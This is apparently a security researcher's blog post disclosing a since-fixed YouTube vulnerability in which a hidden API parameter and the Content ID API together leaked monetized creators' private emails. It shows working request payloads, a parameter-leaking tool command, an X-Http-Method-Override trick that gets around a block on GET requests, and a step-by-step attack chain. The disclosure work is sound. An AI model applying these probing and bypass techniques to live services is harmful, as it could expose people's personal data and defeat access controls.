# Disclosing YouTube Creator Emails for a $20k Bounty

**来源:** https://brutecat.com
**链接:** https://brutecat.com/articles/youtube-creator-emails
**日期:** Thu, 13 Mar 2025 00:00:00 GMT

---

[< Back](/)

[< Back](/)

## Disclosing YouTube Creator Emails for a $20k Bounty

2025-03-13

![Disclosing YouTube Creator Emails for a $20k Bounty](/assets/youtube-creator-emails.jpg)

Some time back, while playing around with Google API requests, I found out it was possible to [leak all request parameters in any Google API endpoint.](/articles/decoding-google#leaking-request-parameters-through-error-messages) This was possible because for whatever reason, sending a request with a wrong parameter type returned debug information about that parameter:

**Request**
    
    
    POST /youtubei/v1/browse HTTP/2
    Host: youtubei.googleapis.com
    Content-Type: application/json
    Content-Length: 164
    
    {
      "context": {
        "client": {
          "clientName": "WEB",
          "clientVersion": "2.20241101.01.00",
        }
      },
      "browseId": 1
    }

> The server actually expects `browseId` to be a string like `"UCX6OQ3DkcsbYNE6H8uQQuVA"`

**Response**
    
    
    HTTP/2 400 Bad Request
    Content-Type: application/json; charset=UTF-8
    Server: scaffolding on HTTPServer2
    
    {
      "error": {
        "code": 400,
        "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
        "errors": [
          {
            "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
            "reason": "invalid"
          }
        ],
        "status": "INVALID_ARGUMENT",
        ...
      }
    }

While YouTube's API normally uses JSON requests for web, it actually also supports another format called ProtoJson aka `application/json+protobuf`

This allows us to specify parameter values in an array, rather than with the parameter name as we would in JSON. We can abuse this logic to provide the wrong parameter type for all parameters without even knowing its name, leaking information about the entire possible request payload.

**Request**
    
    
    POST /youtubei/v1/browse HTTP/2
    Host: youtubei.googleapis.com
    Content-Type: application/json+protobuf
    Content-Length: 22
    
    [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]

**Response**
    
    
    HTTP/2 400 Bad Request
    Content-Type: application/json; charset=UTF-8
    Server: scaffolding on HTTPServer2
    
    {
      "error": {
        "code": 400,
        "message": "Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\nInvalid value at 'browse_id' (TYPE_STRING), 2\nInvalid value at 'params' (TYPE_STRING), 3\nInvalid value at 'continuation' (TYPE_STRING), 7\nInvalid value at 'force_ad_format' (TYPE_STRING), 8\nInvalid value at 'player_request' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.PlayerRequest), 10\nInvalid value at 'query' (TYPE_STRING), 11\nInvalid value at 'has_external_ad_vars' (TYPE_BOOL), 12\nInvalid value at 'force_ad_parameters' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ForceAdParameters), 13\nInvalid value at 'previous_ad_information' (TYPE_STRING), 14\nInvalid value at 'offline' (TYPE_BOOL), 15\nInvalid value at 'unplugged_sort_filter_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedSortFilterOptions), 16\nInvalid value at 'offline_mode_forced' (TYPE_BOOL), 17\nInvalid value at 'form_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseFormData), 18\nInvalid value at 'suggest_stats' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.SearchboxStats), 19\nInvalid value at 'lite_client_request_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.LiteClientRequestData), 20\nInvalid value at 'unplugged_browse_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedBrowseOptions), 22\nInvalid value at 'consistency_token' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ConsistencyToken), 23\nInvalid value at 'intended_deeplink' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DeeplinkData), 24\nInvalid value at 'android_extended_permissions' (TYPE_BOOL), 25\nInvalid value at 'browse_notification_params' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseNotificationsParams), 26\nInvalid value at 'recent_user_event_infos' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.RecentUserEventInfo), 28\nInvalid value at 'detected_activity_info' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DetectedActivityInfo), 30",
        ...
    }

To automate this process, I wrote a tool called [req2proto](https://github.com/ddd/googleapi_tools).
    
    
    $ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3

If we look at the output at `output/youtube/api/pfiinnertube/message.proto`, we can see the full request payload for this endpoint:
    
    
    syntax = "proto3";
    
    package youtube.api.pfiinnertube;
    
    message GetBrowseRequest {
      InnerTubeContext context = 1;
      string browse_id = 2;
      string params = 3;
      string continuation = 7;
      string force_ad_format = 8;
      int32 debug_level = 9;
      PlayerRequest player_request = 10;
      string query = 11;
      ...
    }
    ...

Equipped with this, I started looking around to find any API endpoints with secret parameters that might allow us to leak debug information.

### A seemingly secure endpoint

If you ever looked around at the requests sent by [YouTube Studio](https://studio.youtube.com) to load the "Earn" tab, you might have noticed the following request:

![](/assets/youtube-creator-emails/earn_tab.png)
    
    
    POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
    Host: studio.youtube.com
    Content-Type: application/json
    Cookie: <redacted>
    
    {
      "context": {
        ...
      },
      "channelIds": [
        "UCeGCG8SYUIgFO13NyOe6reQ"
      ],
      "mask": {
        "channelId": true,
        "monetizationStatus": true,
        "monetizationDetails": {
          "all": true
        },
        ...
      }
    }

It's used for fetching our own channel data that's displayed on the Earn tab. That being said, it's actually possible to fetch other channel's metadata with this, albeit with extremely few masks:

**Request**
    
    
    POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
    Host: studio.youtube.com
    Content-Type: application/json
    Cookie: <redacted>
    
    {
      "context": {
        ...
      },
      "channelIds": [
        "UCdcUmdOxMrhRjKMw-BX19AA"
      ],
      "mask": {
        "channelId": true,
        "title": true,
        "thumbnailDetails": {
          "all": true
        },
        "metric": {
          "all": true
        },
        "timeCreatedSeconds": true,
        "isNameVerified": true,
        "channelHandle": true
      }
    }

**Response**
    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=UTF-8
    Server: scaffolding on HTTPServer2
    
    {
      "channels": [
        {
          "channelId": "UCdcUmdOxMrhRjKMw-BX19AA",
          "title": "Niko Omilana",
          ...
          "metric": {
            "subscriberCount": "7700000",
            "videoCount": "142",
            "totalVideoViewCount": "650836435"
          },
          "timeCreatedSeconds": "1308700645",
          "isNameVerified": true,
          "channelHandle": "@Niko",
        }
      ]
    }

The masks seemed quite secure. If we tried requesting any other mask that could be sensitive for a channel we don't have access to, we'd be hit with a Permission denied error:
    
    
    {
      "error": {
        "code": 403,
        "message": "The caller does not have permission",
        "errors": [
          {
            "message": "The caller does not have permission",
            "domain": "global",
            "reason": "forbidden"
          }
        ],
        "status": "PERMISSION_DENIED"
      }
    }

### Leaking secret hidden parameters

As it turns out, if we dump the request payload for this endpoint with [req2proto](https://github.com/ddd/googleapi_tools), we can see there's actually 2 secret hidden parameters:
    
    
    syntax = "proto3";
    
    package youtube.api.pfiinnertube;
    
    message GetCreatorChannelsRequest {
      InnerTubeContext context = 1;
      string channel_ids = 2;
      CreatorChannelMask mask = 4;
      DelegationContext delegation_context = 5;
      bool critical_read = 6; // ???
      bool include_suspended = 7; // ???
    }

Enabling `criticalRead` didn't seem to change anything, but `includeSuspended` was very interesting:
    
    
    {
      ...
      "contentOwnerAssociation": {
        "externalContentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",
        "createTime": {
          "seconds": "1693939737",
          "nanos": 472296000
        },
        "permissions": {
          "canWebClaim": true,
          "canViewRevenue": true
        },
        "isDefaultChannel": false,
        "activateTime": {
          "seconds": "1693939737",
          "nanos": 472296000
        }
      },
      ...
    }

It seemed to leak the channel's `contentOwnerAssociation` But what exactly is that?

### A look into Content ID

In YouTube, there's certain type of special account known as a [Content Manager](https://support.google.com/youtube/answer/6301172) which are given to a select few trusted rightsholders. With these accounts, it's possible to upload audio/video to Content ID as an asset, copyright claiming any external videos that contain the same audio/video as your asset.

![](/assets/youtube-creator-emails/content_manager.png)

These accounts are particularly sensitive, as the Content Manager account allows you to monetize any videos found that contain similar audio/video. Hence, these special accounts are only given to rightsholders with ["complex rights management needs"](https://transparencyreport.google.com/youtube-copyright/summary).

YouTube actually provides a watered-down version of this to all 3 million monetized YouTube creators, known as the [Copyright Match Tool](https://support.google.com/youtube/answer/7648743). This tool only allows creators to request the takedown of videos using their content, rather than being able to monetize them. 

![](/assets/youtube-creator-emails/copyright_match_tool.png)

The interesting thing is that, the backend of this tool is the same as a Content Manager. The moment a channel gets monetization, a `CONTENT_OWNER_TYPE_IVP` content owner account is created:
    
    
    {
      "contentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",
      "displayName": "Nia",
      "type": "CONTENT_OWNER_TYPE_IVP",
      "industryType": "INDUSTRY_TYPE_WEB",
      "primaryContactEmail": "<redacted>@gmail.com",
      "timeCreatedSeconds": "1693939736",
      "traits": {
        "isLongTail": true,
        "isAffiliate": false,
        "isManagedTorso": false,
        "isPremium": false,
        "isUserLevelCidClaimUpdateable": false,
        "isTorso": false,
        "isFingerprintEnabled": false,
        "isBrandconnectAgency": false,
        "isTwoStepVerificationRequirementExempt": false
      },
      "country": "FI"
    }

> **Fun fact:** "IVP" actually stands for Individual Video Partnership, the old name for the YouTube Partner Program!

So, we can leak the `contentOwnerId` of the IVP content owner tied of the channel, but what exactly can we do with this? After doing some research, I found the [YouTube Content ID API](https://developers.google.com/youtube/partner/reference/rest), which is an API intended for rightsholders with a Content Manager account. The `contentOwners.list` endpoint looked particularly interesting. It took in a Content Owner ID and returned their ["conflict notification email"](https://support.google.com/youtube/answer/2811709?hl=en).

Unfortunately, the API seemed to be validating that I didn't have a Content Manager account, and just returned forbidden for any request:
    
    
    {
      "error": {
        "code": 403,
        "message": "Forbidden",
        "errors": [
          {
            "message": "Forbidden",
            "domain": "global",
            "reason": "forbidden"
          }
        ]
      }
    }

Even though this endpoint is only intended for those with a Content Manager account, I had a suspicion that an IVP Content Owner might still work. 

I asked a friend of mine with a monetized YouTube channel test out this endpoint [in the API explorer](https://developers.google.com/youtube/partner/reference/rest/v1/contentOwners/list?apix_params=%7B%22id%22%3A%22kdVwk95TnaCSLJJfyIFoqw%22%7D), and **it worked.**
    
    
    {
      "kind": "youtubePartner#contentOwnerList",
      "items": [
        {
          "kind": "youtubePartner#contentOwner",
          "id": "kdVwk95TnaCSLJJfyIFoqw",
          "displayName": "omilana7",
          "conflictNotificationEmail": "<redacted>@yahoo.co.uk"
        }
      ]
    }

> The conflict notification email was the channel's email at the time the channel got monetized!

Interestingly enough, for whatever reason, even though it worked in the API explorer, you couldn't actually add this API to your own Google Cloud project since it only whitelisted users with an actual Content Manager account. That didn't matter though, we could simply call this API with the API Explorer's client.

### Putting the attack together

We have both parts we need for the attack, let's put it together!

  * Fetch `/get_creator_channels` with `includeSuspended: true` to leak the victim's IVP Content Owner ID.
  * Use the [Content ID API Explorer](https://developers.google.com/youtube/partner/reference/rest/v1/contentOwners/list?apix_params=%7B%22id%22%3A%22kdVwk95TnaCSLJJfyIFoqw%22%7D) with a Google account tied to a monetized channel to fetch the conflict notification email of the victim's IVP Content Owner
  * Profit!



### Timeline

  * 2024-12-12 - Report sent to vendor
  * 2024-12-16 - Vendor triaged report
  * 2024-12-17 - 🎉 **Nice catch!**
  * 2025-01-21 - **Panel awards $13,337.** Rationale: Normal Google Applications. Vulnerability category is "bypass of significant security controls", PII or other confidential information.
  * 2025-01-21 - Clarified to vendor that this was rewarded under "Normal Google Applications". However, [www.youtube.com](https://www.youtube.com) and [studio.youtube.com](https://studio.youtube.com) are Tier 1 domains. See: <https://github.com/google/bughunters/blob/main/domain-tiers/external_domains_google.asciipb>
  * 2025-01-23 - **Panel awards an additional $6,663.** Rationale: Domains where a vulnerability could disclose particularly sensitive user data. Vulnerability category is "bypass of significant security controls", PII or other confidential information.
  * 2025-02-10 - Coordinates disclosure with vendor for _2025-03-13_
  * 2025-02-13 - 🎉 **Google VRP awards swag**
  * 2025-02-21 - Vendor confirms issue has been fixed (T+71 days since disclosure)
  * 2025-03-13 - Report disclosed



### Additional notes

It turns out that the `includeSuspended` parameter could've also been found from the InnerTube discovery document.

When you try to fetch the discovery document normally, you get the following error:

**Request**
    
    
    GET /$discovery/rest HTTP/2
    Host: youtubei.googleapis.com

**Response**
    
    
    HTTP/2 405 Method Not Allowed
    Content-Type: text/html; charset=UTF-8

It seems that `youtubei.googleapis.com` has some [ESPv2](https://github.com/GoogleCloudPlatform/esp-v2) rule set to block GET requests for whatever reason.

I quickly found out we can actually bypass this by sending a POST request, and then overriding it to GET with `X-Http-Method-Override` to get around the block GET rule:

**Request**
    
    
    POST /$discovery/rest HTTP/2
    Host: youtubei.googleapis.com
    X-Http-Method-Override: GET

**Response**
    
    
    HTTP/2 200
    content-type: application/json; charset=UTF-8
    
    {
      "baseUrl": "https://youtubei.googleapis.com/",
      "title": "YouTube Internal API (InnerTube)",
      "documentationLink": "http://go/itgatewa",
      ...

**Update 2025-03-01:** both the prod ([archive](https://archive.org/download/innertube/youtubei.json)) and staging ([archive](https://archive.org/download/innertube/green-youtubei.json)) discovery documents [have since been removed](https://x.com/brutecat/status/1894282218929037727).

If we Ctrl-F for GetCreatorChannelsRequest, we can find the `includeSuspended` parameter:
    
    
      ...
      "YoutubeApiInnertubeGetCreatorChannelsRequest": {
          "id": "YoutubeApiInnertubeGetCreatorChannelsRequest",
          "properties": {
            "channelIds": {
              "items": {
                "type": "string"
              },
              "type": "array"
            },
            ...
            "includeSuspended": {
              "type": "boolean"
            },
            ...
          },
          "type": "object"
        },
      ...

* * *

You can contact me via [![Signal messenger](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2048%2048'%20id='Layer_2'%20data-name='Layer%202'%20xmlns='http://www.w3.org/2000/svg'%20fill='%23ffffff'%20stroke='%23ffffff'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:none;stroke:%23ffffff;stroke-linejoin:round;}%3c/style%3e%3c/defs%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M27.32,45.25A23.08,23.08,0,0,1,24,45.5a22.26,22.26,0,0,1-3.26-.25m14.44-2.88a21,21,0,0,1-6.08,2.51M41.36,36.7a21.63,21.63,0,0,1-4.66,4.65m5.65-6.16,2.54-6.08a21.25,21.25,0,0,1-2.52,6.07m2.88-14.42A23.33,23.33,0,0,1,45.5,24a22.43,22.43,0,0,1-.25,3.28m-42.46,0A22.46,22.46,0,0,1,2.5,24a22.43,22.43,0,0,1,.25-3.28m39.63-7.89a21.7,21.7,0,0,1,2.51,6.08m-41.69,0a21.19,21.19,0,0,1,2.52-6.06h0m31-6.2a21.19,21.19,0,0,1,4.66,4.65m-34.71,0A21.63,21.63,0,0,1,11.3,6.64M29.09,3.1a21.57,21.57,0,0,1,6.07,2.53h0m-22.33,0a21.07,21.07,0,0,1,6.09-2.51m1.84-.37A21.88,21.88,0,0,1,24,2.5a22.29,22.29,0,0,1,3.27.25'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M18.87,44.87a20.92,20.92,0,0,1-5-1.95l-2.24.51'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M4.61,36.38l.51-2.2a21.7,21.7,0,0,1-2-5'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M10,43.85l-4.08,1a2.19,2.19,0,0,1-2.66-1.56,2.27,2.27,0,0,1,0-1.1l1-4.08'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M24,6.41a17.59,17.59,0,0,0-14.83,27l-1.65,7.1,7.16-1.64A17.59,17.59,0,1,0,24,6.41Z'/%3e%3c/g%3e%3c/svg%3e)](https://signal.me/#eu/DK2edygXRPMdt8bnQk0kIz-WNKt40rCDvY-WAi7a4q5ATEQwRxdIGIMSHAJFCgIb) or [![Email](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2024%2024'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cpath%20d='M4%207.00005L10.2%2011.65C11.2667%2012.45%2012.7333%2012.45%2013.8%2011.65L20%207'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3crect%20x='3'%20y='5'%20width='18'%20height='14'%20rx='2'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'/%3e%3c/g%3e%3c/svg%3e)](/cdn-cgi/l/email-protection#57253838231735252223323436237934383a)
